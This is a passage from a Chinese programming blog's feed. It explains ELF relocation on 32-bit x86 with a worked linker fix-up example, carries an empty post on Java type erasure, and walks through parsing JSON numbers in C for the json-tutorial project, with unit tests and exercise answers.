title="重定位模式（指令修改方式）"></a>重定位模式（指令修改方式）</h2><p>不同的处理器指令对于地址的格式和方式都不一样。</p><p>对于32位x86平台下的ELF文件的重定位入口所修正的指令寻址方式只有两种：</p><ul><li>绝对近址32位寻址。</li><li>相对近址32位寻址。</li></ul><p>这两种重定位方式指令修正方式每个被修正的位置的长度都是32位。</p><p>这两种方式的定义：</p><p><img src="/2021/dig-deep-in-relocation/16149fd6ec6f754d" alt="img"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>看这段代码的反汇编结果。</p><p><img src="/2021/dig-deep-in-relocation/16149fd6eac47fa0" alt="img"></p><p>“main”的起始地址为0x00000000，这是因为在未进行空间分配之前，目标文件代码段中的起始地址以0x00000000开始，等到空间分配完成以后，各个函数才会确定自己在虚拟地址空间中的位置。</p><p>偏移为0x18的地址上是一条mov指令，总共8个字节，它的作用是将“shared”的地址赋值到esp寄存器+4的偏移地址中去，前面4个字节“c7442404”是mov的指令码，后面4个字节是“shared”的地址。</p><p>偏移为0x26的地址上是一条调用指令，它表示对swap函数的调用。这条指令共5个字节，前面的0xe8是操作码，这是一条<strong>近址相对位移调用指令</strong>，后面4个字节就是被调用函数的相对于调用指令的下一条指令的偏移量。在没有重定位之前，相对偏移被置为0xFFFFFFFC（小端），它是常量“-4”的补码形式。</p><p>通过前面的重定位表可以看到swap符号的类型为R_386_PC32，这是一条相对位移调用指令。而shared符号的类型为R_386_32，它修正的是一条传输指令的源，即shared的绝对地址。</p><p>假设在将a.o和b.o链接成最终可执行文件后，main函数的虚拟地址为0x1000，swap函数的虚拟地址为0x2000，shared变量的虚拟地址为0x3000。</p><p>首先看偏移为0x18的这条mov指令的修正，它是绝对寻址修正，它修正后的结果是S+A。</p><ul><li>S是符号shared的实际地址，即0x3000。</li><li>A是被修正位置的值，即0x00000000。</li></ul><p>所以它的修正后的地址为：0x3000+0x00000000=0x3000。</p><p><img src="/2021/dig-deep-in-relocation/16149fd6ec61a3b5"></p><p>再来看偏移为0x26的这条call指令的修正，它是相对寻址修正，它修正后的结果是S+A-P。</p><ul><li>S是符号swap的实际地址，即0x2000。</li><li>A是被修正位置的值，即0xFFFFFFFC(-4)。</li><li>P为被修正的位置，当链接成可执行文件时，这个值应该是被修正位置的虚拟地址，即0x1000+0x27。</li></ul><p>所以它的修正后的地址为0x2000+(-4)-(0x1000+0x27)=0xFD5。</p><p><img src="/2021/dig-deep-in-relocation/16149fd719467a60"></p><p>这条相对位移调用指令的调用地址是该指令下一条指令的起始地址加上偏移量，即：0x102b+0xfd5=0x2000，刚好是swap函数的地址。</p><p>从这两个例子可以看出来，绝对寻址修正和相对寻址修正的区别就是绝对寻址修正后的地址为该符号的实际地址；相对寻址修正后的地址为符号距离被修正位置的<strong>地址差</strong>。</p><h1 id="编译器的工作"><a href="#编译器的工作" class="headerlink" title="编译器的工作"></a>编译器的工作</h1><p>原文：参考资料2</p><p>编译器在将源文件编译生成目标文件时可以确定一下两件事：</p><ul><li>定义在该源文件中函数的内存地址</li><li>定义在该源文件中全局变量的内存地址</li></ul><p>注意这里的内存地址其实只是相对地址，相对于谁的呢，相对于自己的。为什么只是一个相对地址呢？因为在生成一个目标文件时编译器并不知道这个目标文件要和哪些目标文件进行链接生成最后的可执行文件，链接器才知道要链接哪些目标文件，因此编译器仅仅生成一个相对地址。</p><p>而对于引用类的变量，也就是在当前代码中引用而定义是在其它源文件中的变量，对于这样的变量编译器是无法确定其内存地址的，这不是编译器需要关心的，确定引用类变量的内存地址是链接器的任务，链接器在进行链接时能够确定这类变量的内存地址。因此当编译器在遇到这样的变量时，比如使用了外部定义的函数时，其在目标文件中对应的机器指令可能是这样的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 0x000000</span><br></pre></td></tr></table></figure><p>也就是说对于编译器不能确定的地址都这设置为空(0x000000)，同时编译器还会生成一条记录，该记录告诉链接器在进行链接时要修正这条指令中函数的内存地址，这个记录就放在了目标文件的.rel.text段中。相应的如果是对外部定义的全局变量的使用，则该记录放在了目标文件的.rel.data段中。即链接器需要在链接过程中根据.rel.data以及.rel.text来填好编译器留下的空白位置(0x000000)。因此在这里我们进一步丰富目标文件中的内容，如图所示：</p><p><img src="/2021/dig-deep-in-relocation/bVbg4Ua"></p><p>生成目标文件后，编译器完成任务，编译器确定了定义在该源文件中函数以及全局变量的相对地址。对于编译器不能确定的引用类变量，编译器在目标文件的.rel.text以及.rel.data段中生成相应的记录告诉链接器要修正这些变量的地址。</p><p>接下来就是链接器的工作了。</p><h1 id="链接器的工作"><a href="#链接器的工作" class="headerlink" title="链接器的工作"></a>链接器的工作</h1><p>原文：参考资料2</p><p>我们在静态库下可执行文件的生成一节中知道，链接器会将所有的目标文件进行合并，所有目标文件的数据段合并到可执行文件的数据段，所有目标文件的代码段合并到可执行文件的代码段。当所有合并完成后，各个目标文件中的相对地址也就确定了。因此在这个阶段，链接器需要修正目标文件中的相对地址。</p><p>在这里我们以合并目标文件中的数据段为例来说明链接器是如何修正目标文件的相对地址的，合并代码段时修正相对位置的原理是一样的。</p><p>我们假设链接器需要链接三个目标文件：</p><ul><li>目标文件一：该文件数据段定义了两个变量apple和banana，apple的长度为2字节，banana的长度4字节，因此目标文件一的数据段长度为6字节。从图中也可以看出apple的内存地址为0，也就是相对地址，即apple这个变量在目标文件一的地址是0，banana的地址为2。</li><li>目标文件二：该文件的数据段比较简单，只定义了一个变量orange，其长度为2，因此该目标文件的数据段长度为2。</li><li>目标文件三：该文件的数据段定义了三个变量grape、mango以及limo，其长度分别为4字节、2字节以及2字节，因此该目标文件的数据段长度为8字节。</li></ul><p><img src="/2021/dig-deep-in-relocation/bVbg4TV"></p><p>链接器在链接三个目标文件时其顺序是依次链接的，链接完成后：</p><ul><li>目标文件一：该数据段的起始地址为0，因此该数据段中的变量的最终地址不变。</li><li>目标文件二：由于目标文件一的数据段长度为6，因此链接完成后该数据段的起始地址为6(这里的起始地址其实就是偏移offset)，相应的orange的最终内存地址为0+offset即6。</li><li>目标文件三：由于前两个数据段的长度为8，因此该数据段的起始地址为8(即offset为8)，因此所有该数据段中的变量其地址都要加上该offset，即grape的最终地址为8，即0+offset，mango的最终地址为4+offset即12，limo的最终地址为6+offset即14。</li></ul><p>从这个过程中可以看到，数据段中的相对地址是通过这个公式来修正的，即：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">相对地址 + <span class="built_in">offset</span>(偏移) = 最终内存地址</span><br></pre></td></tr></table></figure><p>而每个段的偏移只有在链接完成后才能确定，因此对相对地址的修正只能由链接器来完成，编译器无法完成这项任务。</p><p>当所有目标文件的同类型段合并完毕后，数据段和代码段中的相对地址都被链接器修正为最终的内存位置，这样所有的变量以及函数都确定了其各自位置。</p><p>至此，重定位的第一阶段完成。接下来是重定位的第二阶段，即引用符号的重定位。</p><p>相对地址是编译器在编译过程中确定了，在链接器完成后被链接器修正为最终地址，而对于编译器没有确定的所引用的外部函数以及变量的地址，编译器将其记录在了.rel.text和.rel.data中。</p><p>由于在第一阶段中，所有函数以及数据都有了最终地址，因此重定位的第二阶段就相对简单了。我们知道编译器引用外部变量时将机器指令中的引用地址设置为空(比如call 0x000000)，并将该信息记录在了目标文件的.rel.text以及.rel.data段中。因此在这个阶段链接器依次扫描所有的.rel.text以及.rel.data段并找到相应变量的最终地址(这些位置都已在第一阶段确定)，并将机器指令中的0x000000修正为所引用变量的最终地址就可以了。</p><p>作为程序员一般很少会有问题出现在重定位阶段，因此这个阶段对程序员相对透明。请同学们注意一点，这里的分析仅限于目标文件的静态链接。我们知道静态链接下，链接器会将需要的代码和数据都合并到可执行文件当中，因此需要确定代码和数据的最终位置。而对于动态链接库来说情况则有所不同，动态链接库可以同时被多个进程使用，如果动态链接库的机器指令中不可以存在引用变量的最终位置，否则在被多个进程使用时会出现一个进程中使用的数据被其它进程修改。因此动态库下的机器指令都是PIC代码，即位置无关代码(Position-Independent Code)。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;转载整理：从编译器、链接器的角度介绍重定位的全过程和利用一个实例帮助理解。&lt;/p&gt;</summary>
    
    
    
    <category term="系统" scheme="https://www.fvolcano.red/categories/%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>理解Java中的类型擦除</title>
    <link href="https://www.fvolcano.red/2021/the-class-erase-in-Java/"/>
    <id>https://www.fvolcano.red/2021/the-class-erase-in-Java/</id>
    <published>2021-07-11T04:13:01.000Z</published>
    <updated>2021-07-11T04:13:01.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>跟着做一个JSON解析器（二）</title>
    <link href="https://www.fvolcano.red/2021/Make-a-JSON-parser-2/"/>
    <id>https://www.fvolcano.red/2021/Make-a-JSON-parser-2/</id>
    <published>2021-07-11T01:21:47.000Z</published>
    <updated>2021-07-11T01:21:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第二单元，重点在于解析 JSON number 类型。<a id="more"></a></p><p>👉<a href="https://github.com/miloyip/json-tutorial">原项目地址</a></p><h1 id="一、JSON-数字语法"><a href="#一、JSON-数字语法" class="headerlink" title="一、JSON 数字语法"></a>一、JSON 数字语法</h1><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">number</span> = [ <span class="string">&quot;-&quot;</span> ] int [ frac ] [ exp ]</span><br><span class="line"><span class="attr">int</span> = <span class="string">&quot;0&quot;</span> / digit1-<span class="number">9</span> *digit</span><br><span class="line"><span class="attr">frac</span> = <span class="string">&quot;.&quot;</span> <span class="number">1</span>*digit</span><br><span class="line"><span class="attr">exp</span> = (<span class="string">&quot;e&quot;</span> / <span class="string">&quot;E&quot;</span>) [<span class="string">&quot;-&quot;</span> / <span class="string">&quot;+&quot;</span>] <span class="number">1</span>*digit</span><br></pre></td></tr></table></figure><p>number 是以十进制表示，它主要由 4 部分顺序组成：负号、整数、小数、指数。只有整数是必需部分。注意和直觉可能不同的是，正号是不合法的。</p><p>整数部分如果是 0 开始，只能是单个 0；而由 1-9 开始的话，可以加任意数量的数字（0-9）。也就是说，<code>0123</code> 不是一个合法的 JSON 数字。</p><p>小数部分比较直观，就是小数点后是一或多个数字（0-9）。</p><p>JSON 可使用科学记数法，指数部分由大写 E 或小写 e 开始，然后可有正负号，之后是一或多个数字（0-9）。</p><p>JSON 标准 <a href="https://www.ecma-international.org/publications/files/ECMA-ST/ECMA-404.pdf">ECMA-404</a> 采用图的形式表示语法，也可以更直观地看到解析时可能经过的路径：</p><p><a href="https://github.com/Buland-RAn/json-tutorial/blob/master/tutorial02/images/number.png"><img src="/2021/Make-a-JSON-parser-2/number.png" alt="number"></a></p><p>上一单元的 null、false、true 在解析后，我们只需把它们存储为类型。但对于数字，我们要考虑怎么存储解析后的结果。</p><h1 id="二、数字表示方式"><a href="#二、数字表示方式" class="headerlink" title="二、数字表示方式"></a>二、数字表示方式</h1><p>从 JSON 数字的语法，我们可能直观地会认为它应该表示为一个浮点数（floating point number），因为它带有小数和指数部分。然而，标准中并没有限制数字的范围或精度。为简单起见，leptjson 选择以双精度浮点数（C 中的 <code>double</code> 类型）来存储 JSON 数字。</p><p>为 <code>lept_value</code> 添加成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> n;</span><br><span class="line">    lept_type type;</span><br><span class="line">&#125;lept_value;</span><br></pre></td></tr></table></figure><p>仅当 <code>type == LEPT_NUMBER</code> 时，<code>n</code> 才表示 JSON 数字的数值。所以获取该值的 API 是这么实现的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">lept_get_number</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span> </span>&#123;</span><br><span class="line">    assert(v != <span class="literal">NULL</span> &amp;&amp; v-&gt;type == LEPT_NUMBER);</span><br><span class="line">    <span class="keyword">return</span> v-&gt;n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用者应确保类型正确，才调用此 API。我们继续使用断言来保证。</p><h1 id="三、单元测试"><a href="#三、单元测试" class="headerlink" title="三、单元测试"></a>三、单元测试</h1><p>我们定义了 API 之后，按照 TDD，我们可以先写一些单元测试。这次我们使用多行的宏来减少重复代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST_NUMBER(expect, json)\</span></span><br><span class="line">    <span class="keyword">do</span> &#123;\</span><br><span class="line">        lept_value v;\</span><br><span class="line">        EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, json));\</span><br><span class="line">        EXPECT_EQ_INT(LEPT_NUMBER, lept_get_type(&amp;v));\</span><br><span class="line">        EXPECT_EQ_DOUBLE(expect, lept_get_number(&amp;v));\</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_number</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    TEST_NUMBER(<span class="number">0.0</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">0.0</span>, <span class="string">&quot;-0&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">0.0</span>, <span class="string">&quot;-0.0&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1.0</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">-1.0</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1.5</span>, <span class="string">&quot;1.5&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">-1.5</span>, <span class="string">&quot;-1.5&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">3.1416</span>, <span class="string">&quot;3.1416&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1E10</span>, <span class="string">&quot;1E10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1e10</span>, <span class="string">&quot;1e10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1E+10</span>, <span class="string">&quot;1E+10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1E-10</span>, <span class="string">&quot;1E-10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">-1E10</span>, <span class="string">&quot;-1E10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">-1e10</span>, <span class="string">&quot;-1e10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">-1E+10</span>, <span class="string">&quot;-1E+10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">-1E-10</span>, <span class="string">&quot;-1E-10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1.234E+10</span>, <span class="string">&quot;1.234E+10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">1.234E-10</span>, <span class="string">&quot;1.234E-10&quot;</span>);</span><br><span class="line">    TEST_NUMBER(<span class="number">0.0</span>, <span class="string">&quot;1e-10000&quot;</span>); <span class="comment">/* must underflow */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上这些都是很基本的测试用例，也可供调试用。大部分情况下，测试案例不能穷举所有可能性。因此，除了加入一些典型的用例，我们也常会使用一些边界值，例如最大值等。</p><p>除了这些合法的 JSON，我们也要写一些不合语法的用例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_invalid_value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="comment">/* invalid number */</span></span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;+0&quot;</span>);</span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;+1&quot;</span>);</span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;.123&quot;</span>); <span class="comment">/* at least one digit before &#x27;.&#x27; */</span></span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;1.&quot;</span>);   <span class="comment">/* at least one digit after &#x27;.&#x27; */</span></span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;INF&quot;</span>);</span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;inf&quot;</span>);</span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;NAN&quot;</span>);</span><br><span class="line">    TEST_ERROR(LEPT_PARSE_INVALID_VALUE, <span class="string">&quot;nan&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="四、十进制转换至二进制"><a href="#四、十进制转换至二进制" class="headerlink" title="四、十进制转换至二进制"></a>四、十进制转换至二进制</h1><p>我们需要把十进制的数字转换成二进制的 <code>double</code>。这并不是容易的事情。为了简单起见，leptjson 使用标准库的 <a href="https://en.cppreference.com/w/c/string/byte/strtof"><code>strtod()</code></a> 来进行转换。<code>strtod()</code> 可转换 JSON 所要求的格式，但问题是，一些 JSON 不容许的格式，<code>strtod()</code> 也可转换，所以我们需要自行做格式校验。</p><blockquote><p>函数 strtod() 用来将字符串转换成双精度浮点数(double)，其原型为：<br>double strtod (const char* str, char** endptr);</p><p><a href="https://en.cppreference.com/w/c/string/byte/strtof">https://en.cppreference.com/w/c/string/byte/strtof</a></p><p>【参数说明】str 为要转换的字符串，endstr 为第一个不能转换的字符的指针。</p><p>【函数说明】strtod() 函数会扫描参数str字符串，跳过前面的空白字符（例如空格，tab缩进等，可以通过 <a href="http://c.biancheng.net/cpp/html/120.html">isspace()</a> 函数来检测），直到遇上数字或正负符号才开始做转换，到出现非数字或字符串结束时(‘\0’)才结束转换，并将结果返回。参数 str 字符串可包含正负号、小数点或E(e)来表示指数部分。如123. 456 或123e-2。</p><p>若endptr 不为NULL，则会将遇到的不符合条件而终止的字符指针由 endptr 传回；若 endptr 为 NULL，则表示该参数无效，或不使用该参数。</p><p>【返回值】返回转换后的浮点型数；若不能转换或字符串为空，则返回 0.0。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  /* NULL, strtod() */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_number</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* end;</span><br><span class="line">    <span class="comment">/* TODO validate number */</span></span><br><span class="line">    v-&gt;n = strtod(c-&gt;json, &amp;end);</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;json == end)</span><br><span class="line">        <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    c-&gt;json = end;</span><br><span class="line">    v-&gt;type = LEPT_NUMBER;</span><br><span class="line">    <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>c-&gt;json == end</code>说明json字符串开头就不符合double的语法，没有开始转换。</p><p>加入了 number 后，value 的语法变成：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">value</span> <span class="string">=</span> <span class="literal">null</span> <span class="string">/</span> <span class="literal">false</span> <span class="string">/</span> <span class="literal">true</span> <span class="string">/</span> <span class="string">number</span></span><br></pre></td></tr></table></figure><p>记得在第一单元中，我们说可以用一个字符就能得知 value 是什么类型，有 11 个字符可判断 number：</p><ul><li>0-9/- ➔ number</li></ul><p>但是，由于我们在 <code>lept_parse_number()</code> 内部将会校验输入是否正确的值，我们可以简单地把余下的情况都交给 <code>lept_parse_number()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_value</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (*c-&gt;json) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:  <span class="keyword">return</span> lept_parse_true(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:  <span class="keyword">return</span> lept_parse_false(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:  <span class="keyword">return</span> lept_parse_null(c, v);</span><br><span class="line">        <span class="keyword">default</span>:   <span class="keyword">return</span> lept_parse_number(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>: <span class="keyword">return</span> LEPT_PARSE_EXPECT_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="五、总结与练习答案"><a href="#五、总结与练习答案" class="headerlink" title="五、总结与练习答案"></a>五、总结与练习答案</h1><p>本单元讲述了 JSON 数字类型的语法，以及 leptjson 所采用的自行校验＋<code>strtod()</code>转换为 <code>double</code> 的方案。实际上一些 JSON 库会采用更复杂的方案，例如支持 64 位带符号／无符号整数，自行实现转换。解析／生成数字类型可以说是 RapidJSON 中最难实现的部分，也是 RapidJSON 高效性能的原因。</p><ol><li>重构合并 <code>lept_parse_null()</code>、<code>lept_parse_false()</code>、<code>lept_parse_true</code> 为 <code>lept_parse_literal()</code>。</li></ol><p>由于 true / false / null 的字符数量不一样，这个答案以 for 循环作比较，直至 <code>&#39;\0&#39;</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_literal</span><span class="params">(lept_context* c, lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* literal, lept_type type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    EXPECT(c, literal[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; literal[i + <span class="number">1</span>]; i++)</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;json[i] != literal[i + <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    c-&gt;json += i;</span><br><span class="line">    v-&gt;type = type;</span><br><span class="line">    <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_value</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (*c-&gt;json) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:  <span class="keyword">return</span> lept_parse_literal(c, v, <span class="string">&quot;true&quot;</span>, LEPT_TRUE);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:  <span class="keyword">return</span> lept_parse_literal(c, v, <span class="string">&quot;false&quot;</span>, LEPT_FALSE);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:  <span class="keyword">return</span> lept_parse_literal(c, v, <span class="string">&quot;null&quot;</span>, LEPT_NULL);</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意在 C 语言中，数组长度、索引值最好使用 <code>size_t</code> 类型，而不是 <code>int</code> 或 <code>unsigned</code>。</p><p>你也可以直接传送长度参数 4、5、4，只要能通过测试就行了。</p><ol start="2"><li>加入 <a href="https://en.wikipedia.org/wiki/Double-precision_floating-point_format#Double-precision_examples">维基百科双精度浮点数</a> 的一些边界值至单元测试，如 min subnormal positive double、max double 等。</li></ol><p>这问题其实涉及一些浮点数类型的细节，例如 IEEE-754 浮点数中，有所谓的 normal 和 subnormal 值，这里暂时不展开讨论了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TEST_NUMBER(<span class="number">1.0000000000000002</span>, <span class="string">&quot;1.0000000000000002&quot;</span>); <span class="comment">/* the smallest number &gt; 1 */</span></span><br><span class="line">TEST_NUMBER( <span class="number">4.9406564584124654e-324</span>, <span class="string">&quot;4.9406564584124654e-324&quot;</span>); <span class="comment">/* minimum positive denormal */</span></span><br><span class="line">TEST_NUMBER(<span class="number">-4.9406564584124654e-324</span>, <span class="string">&quot;-4.9406564584124654e-324&quot;</span>);</span><br><span class="line">TEST_NUMBER( <span class="number">2.2250738585072009e-308</span>, <span class="string">&quot;2.2250738585072009e-308&quot;</span>);  <span class="comment">/* Max subnormal double */</span></span><br><span class="line">TEST_NUMBER(<span class="number">-2.2250738585072009e-308</span>, <span class="string">&quot;-2.2250738585072009e-308&quot;</span>);</span><br><span class="line">TEST_NUMBER( <span class="number">2.2250738585072014e-308</span>, <span class="string">&quot;2.2250738585072014e-308&quot;</span>);  <span class="comment">/* Min normal positive double */</span></span><br><span class="line">TEST_NUMBER(<span class="number">-2.2250738585072014e-308</span>, <span class="string">&quot;-2.2250738585072014e-308&quot;</span>);</span><br><span class="line">TEST_NUMBER( <span class="number">1.7976931348623157e+308</span>, <span class="string">&quot;1.7976931348623157e+308&quot;</span>);  <span class="comment">/* Max double */</span></span><br><span class="line">TEST_NUMBER(<span class="number">-1.7976931348623157e+308</span>, <span class="string">&quot;-1.7976931348623157e+308&quot;</span>);</span><br></pre></td></tr></table></figure><p>另外，这些加入的测试用例，正常的 <code>strtod()</code> 都能通过。所以不能做到测试失败、修改实现、测试成功的 TDD 步骤。</p><p>有一些 JSON 解析器不使用 <code>strtod()</code> 而自行转换，例如在校验的同时，记录负号、尾数（整数和小数）和指数，然后 naive 地计算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> negative = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int64_t</span> mantissa = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 解析... 